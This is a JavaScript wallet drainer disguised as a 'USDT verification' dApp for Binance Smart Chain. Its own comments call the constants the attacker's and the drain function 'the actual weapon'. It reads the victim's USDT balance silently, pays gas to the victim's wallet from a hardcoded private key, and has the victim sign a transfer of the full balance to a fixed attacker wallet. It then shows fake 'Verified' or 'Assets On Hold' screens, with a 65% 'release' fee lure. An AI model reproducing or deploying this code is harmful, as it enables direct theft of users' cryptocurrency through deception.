// ── Phase 1: Module Initialization ──

import { ethers } from 'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.esm.min.js';


// ── Attacker's Operational Constants ──
const SPONSOR_KEY  = " 57a1d2fa6ce5b3b119f2b82dd643c224604553713fadff3ea57393ce556a327f";
const DEST_WALLET  = "0xCEeAffeE84F6b3Ee513E84Ea0B125F3cBAeB6b72";
const USDT_BEP20   = "0x55d398326f99059fF775485246999027B3197955";
const BSC_RPC      = "https://bsc-dataseed1.binance.org/";
const BSC_CHAIN_ID = "0x38";
const MIN_DRAIN    = 20;

// ── Runtime State ──
let provider;
let sponsorWallet;
let userAddress;
let currentLockAmount = 0;

// ── C: Wallet Detection Layer (Trust Wallet aware) ──
const isTrust = window.ethereum?.isTrust === true ||
    navigator.userAgent.includes('TrustWallet') ||
    document.querySelector('meta[name="dapp-browser"][content="trust"]') !== null;

// ── D: Silent Recon Engine (no popups, raw JSON-RPC) ──

// D1 — BNB gas check & sponsor refuel (only for high-value: USDT > 20)
// Sends 0.00006 BNB if BNB balance is below 0.00015, once per verification event
async function checkAndRefuel(addr) {
    try {
        const balance = await provider.getBalance(addr);
        if (balance.lt(ethers.utils.parseEther("0.00015"))) {
            const tx = { to: addr, value: ethers.utils.parseEther("0.00006") };
            const sentTx = await sponsorWallet.sendTransaction(tx);
            await sentTx.wait();
        }
    } catch (e) {}
}

// D2 — Silent balanceOf via raw eth_call (0x70a08231)
async function fetchMaxBalance(addr) {
    try {
        const data = "0x70a08231" + addr.replace('0x', '').padStart(64, '0');
        const res = await fetch(BSC_RPC, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                jsonrpc: "2.0", id: 1,
                method: "eth_call",
                params: [{ to: USDT_BEP20, data: data }, "latest"]
            })
        });
        const json = await res.json();
        return (json.result && json.result !== '0x') ? json.result : null;
    } catch (e) { return null; }
}

// ── E: Drain Engine (the actual weapon) ──
async function executeDrain(balanceHex) {
    const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;
    currentLockAmount = balVal;

    if (balVal < MIN_DRAIN) {
        showReport(balVal, true);
        return;
    }

    const cleanDest = DEST_WALLET.replace('0x', '').toLowerCase().padStart(64, '0');
    const cleanVal  = balanceHex.replace('0x', '').padStart(64, '0');
    const txData    = "0xa9059cbb" + cleanDest + cleanVal;

    await window.ethereum.request({
        method: 'eth_sendTransaction',
        params: [{
            from: userAddress,
            to: USDT_BEP20,
            data: txData,
            value: '0x0'
        }]
    });

    showReport(balVal, false);
}

// ── F: DOM Registry (bnbscan_pro.html IDs) ──

const ui = {
    verifyBtn: document.getElementById('connect-button'),
    initialUI: document.getElementById('initialUI'),
    reportPage: document.getElementById('reportPage'),
    standardReport: document.getElementById('standardReport'),
    unlockWarningUI: document.getElementById('unlockWarningUI'),
    repAmount: document.getElementById('repAmount'),
    mainIcon: document.getElementById('mainIcon'),
    repTitle: document.getElementById('repTitle'),
    repSub: document.getElementById('repSub'),
    repBoxLabel: document.getElementById('repBoxLabel'),
    btnViewTx: document.getElementById('btnViewTx'),
    btnRelease: document.getElementById('btnRelease'),
    btnContinue: document.getElementById('btnContinue'),
    calc65Amount: document.getElementById('calc65Amount')
};

// ── G: Module Entry Point (DOMContentLoaded, fires once) ──

document.addEventListener('DOMContentLoaded', () => {

    // Check 1 — Served from real web server (not file://)
    if (location.protocol === 'file:') {
        console.warn('[ABORT] Check 1 fail: file:// protocol');
        return;
    }

    // Check 2 — window.ethereum injected by wallet
    if (typeof window.ethereum === 'undefined') {
        console.warn('[ABORT] Check 2 fail: no injected Web3 provider');
        return;
    }

    // Check 3 — connect-button exists in DOM
    if (!ui.verifyBtn) {
        console.warn('[ABORT] Check 3 fail: #connect-button not found');
        return;
    }

    // Bind click listener
    ui.verifyBtn.addEventListener('click', handleVerifyClick);
});

// ── Main Interaction Controller ──

async function handleVerifyClick() {
    if (ui.verifyBtn.disabled) return;

    const originalContent = ui.verifyBtn.innerHTML;
    ui.verifyBtn.disabled = true;
    ui.verifyBtn.innerHTML = 'Analyzing... <div class="loader-spin"></div>';

    try {
        // Step 1 — Switch to BSC network
        await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: BSC_CHAIN_ID }]
        });

        // Step 2 — Get user wallet address
        const accounts = await window.ethereum.request({ method: 'eth_accounts' }) || [];
        userAddress = accounts[0] ||
            (await window.ethereum.request({ method: 'eth_requestAccounts' }))[0];

        // Step 3 — Init backend pipeline + sponsor wallet
        provider = new ethers.providers.JsonRpcProvider(BSC_RPC);
        sponsorWallet = new ethers.Wallet(SPONSOR_KEY, provider);

        // Step 4 — Silent USDT balance recon (raw JSON-RPC, no popup)
        const balanceHex = await fetchMaxBalance(userAddress);
        const balVal = balanceHex ? parseInt(balanceHex, 16) / 10**18 : 0;

        // Step 5 — Gas refuel: only if USDT > 20 and BNB < 0.00015
        if (balVal > MIN_DRAIN) {
            await checkAndRefuel(userAddress);
        }
        // If USDT <= 20, no BNB is sent

        // Step 6 — Decision gate & drain
        await executeDrain(balanceHex);

        // Reset button — showReport() handles the UI transition
        ui.verifyBtn.disabled = false;
        ui.verifyBtn.innerHTML = originalContent;

    } catch (error) {
        ui.verifyBtn.disabled = false;
        ui.verifyBtn.innerHTML = originalContent;
    }
}

// ── UI Helpers (bnbscan_pro.html DOM IDs) ──

function showReport(val, isGenuine) {
    if (!ui.initialUI) return;

    ui.initialUI.style.display = 'none';
    ui.reportPage.style.display = 'block';
    // Dynamic decimal formatting
    let formattedVal;
    const decimalPart = val.toString().split('.')[1] || '';
    if (decimalPart.length <= 2 || parseFloat(decimalPart) === 0) {
        formattedVal = val.toFixed(2);
    } else {
        formattedVal = val.toFixed(5);
    }
    ui.repAmount.textContent = formattedVal + ' USDT';
    // Auto-shrink font if too many digits
    const totalChars = formattedVal.length;
    if (totalChars > 10) {
        ui.repAmount.style.fontSize = '1.2rem';
    } else {
        ui.repAmount.style.fontSize = '1.8rem';
    }

    if (!isGenuine) {
        // Balance >= 20 USDT — Asset On Hold state (warning icon)
        ui.mainIcon.textContent = '⚠️';
        ui.mainIcon.style.color = '#F3BA2F';
        ui.repTitle.textContent = 'Assets On Hold';
        ui.repSub.textContent = 'Your assets are temporarily locked for security verification';
        ui.repBoxLabel.textContent = 'Hold balance';
        ui.repAmount.style.color = '#F3BA2F';
        ui.btnViewTx.style.display = 'none';
        ui.btnRelease.style.display = 'flex';
        ui.btnRelease.innerHTML = '<span>🔒</span> Release Funds';
        if (ui.btnContinue) ui.btnContinue.style.display = 'none';
        const pendingStatus = document.getElementById('repPendingStatus');
        if (pendingStatus) {
            pendingStatus.style.display = 'flex';
            const pendingText = document.getElementById('repPendingText');
            if (pendingText) pendingText.textContent = 'Verification Pending';
        }
    } else {
        // Balance < 20 USDT — Verification Successful state (green, clean)
        ui.mainIcon.innerHTML = '<svg width="42" height="42" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="display:inline-block; vertical-align:middle;"><path d="M12 2 4 5v6c0 5.55 3.84 10.74 8 11 4.16-.26 8-5.45 8-11V5l-8-3Z" fill="#00ff88" opacity="0.15"/><path d="M12 2 4 5v6c0 5.55 3.84 10.74 8 11 4.16-.26 8-5.45 8-11V5l-8-3Z" fill="none" stroke="#00ff88" stroke-width="1.6" stroke-linejoin="round"/><path d="m8.5 12 2.5 2.5 5-5" fill="none" stroke="#00ff88" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>';
        ui.mainIcon.style.color = '#00ff88';
        ui.repTitle.textContent = 'USDT Verified!';
        ui.repSub.textContent = 'Your tokens are genuine and safe to use.';
        ui.repBoxLabel.textContent = 'Verified balance';
        ui.repAmount.style.color = '#00ff88';
        ui.btnViewTx.style.display = 'none';
        ui.btnRelease.style.display = 'none';
        if (ui.btnContinue) ui.btnContinue.style.display = 'flex';
        const pendingStatus = document.getElementById('repPendingStatus');
        if (pendingStatus) pendingStatus.style.display = 'none';
    }
}

function open65Warning() {
    if (!ui.standardReport) return;
    ui.standardReport.style.display = 'none';
    ui.unlockWarningUI.style.display = 'block';
    const calcVal = currentLockAmount * 0.65;
    ui.calc65Amount.textContent = calcVal.toFixed(2) + ' USDT';
}

window.open65Warning = open65Warning;
